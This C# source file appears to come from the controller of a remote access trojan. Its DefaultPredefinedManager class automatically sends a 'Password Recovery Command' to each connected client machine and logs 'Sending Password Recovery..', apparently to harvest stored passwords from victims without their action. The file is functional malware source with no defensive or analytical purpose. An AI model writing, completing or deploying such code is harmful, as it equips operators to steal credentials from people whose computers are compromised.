using Server.Connection;
using Server.Handle_Packet;
using Server.MessagePack;
using Server.Predefined.Commands;
using System;
using System.Drawing;
using System.Threading;

namespace Server.Predefined {

    public static class DefaultPredefinedManager {

        private static PredefinedCommand[] Messages => new[] {
            new PredefinedRecoveryCommand()
        };

        public static void ExecuteOnClient(Clients client) {

            foreach (var message in Messages) {
                try {
                    switch (message.CommandName) {
                        case "Password Recovery Command":
                            Recovery_Password(client, message);
                            break;
                    }
                }
                catch (Exception ex) {
                    HandleLogs.Instance.Addmsg($"Error executing the command {message.CommandName}", Color.Red);

                    continue;
                }
            }
        }


        #region [ Handlers ]
        static void Recovery_Password(Clients client, MsgPack msgpack) {
            client.LV.ForeColor = Color.Red;

            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
            HandleLogs.Instance.Addmsg("Sending Password Recovery..", Color.Black);
        }
        #endregion
    }
}
